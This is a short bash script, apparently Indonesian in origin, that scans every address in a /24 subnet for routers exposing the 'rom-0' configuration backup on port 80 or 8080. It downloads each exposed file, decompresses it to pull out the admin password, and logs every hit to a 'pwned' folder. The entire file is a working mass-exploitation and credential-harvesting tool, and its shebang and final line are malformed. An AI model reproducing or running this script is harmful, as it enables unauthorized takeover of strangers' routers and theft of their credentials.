#/bin/bash

prefix="$1"

mkdir -p "rom" "pwned"
tanggal=$(date +%Y-%m-%d_%H%M%S)

decompress() {
  ./decompress "rom/$1" > /dev/null 2>&1
  pass=$(strings "rom/$1.decomp" | head -n 1)
  if [ -z "$2" ]
    then
      echo -e "\e[1;92m$1\e[0;92m > OK! Password: \e[1;93m$pass \e[0;39m"
      echo "$1 > Password: $pass" >> "pwned/$prefix ($tanggal)"
    else
      echo -e "\e[1;92m$1:8080\e[0;92m > OK! Password: \e[1;93m$pass \e[0;39m"
      echo "$1:8080 > Password: $pass" >> "pwned/$prefix ($tanggal)"
  fi
  rm "rom/$1" "rom/$1.decomp"
}

for i in $prefix.{1..255}
do
  wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i/rom-0"
  EXIT_CODE=$?

  if [ $EXIT_CODE -gt 0 ];
    then
      # coba port 8080
      wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i:8080/rom-0"
      EXIT_CODE=$?

      if [ $EXIT_CODE -gt 0 ];
        then
          echo -e "$i > \e[31mFailed! -non vulnerable?- \e[0;39m"
      else
        wget -q "http://$i:8080/rom-0" -O "rom/$i" &
        PID=$!
        sleep 3
        PSPID=$(ps | grep $PID | grep -v grep)
        if [ "$PSPID" != "" ]; then
          # macet
          kill $PID > /dev/null 2>&1
          echo -e "$i > \e[31mFailed! -timeout- \e[0;39m"
        else
          # ok
          # decompress 8080
          decompress "$i" "8080"
        fi
      fi

  else
    wget -q "http://$i/rom-0" -O "rom/$i" &
    PID=$!
    sleep 3
    PSPID=$(ps | grep $PID | grep -v grep)
    if [ "$PSPID" != "" ]; then
      # macet
      kill $PID > /dev/null 2>&1
      echo -e "$i > \e[31mFailed! -timeout- \e[0;39m"
    else
      # ok
      # decompress
      decompress "$i"
    fi
  fi

done
rm "rom/*" > /dev/null 2>&
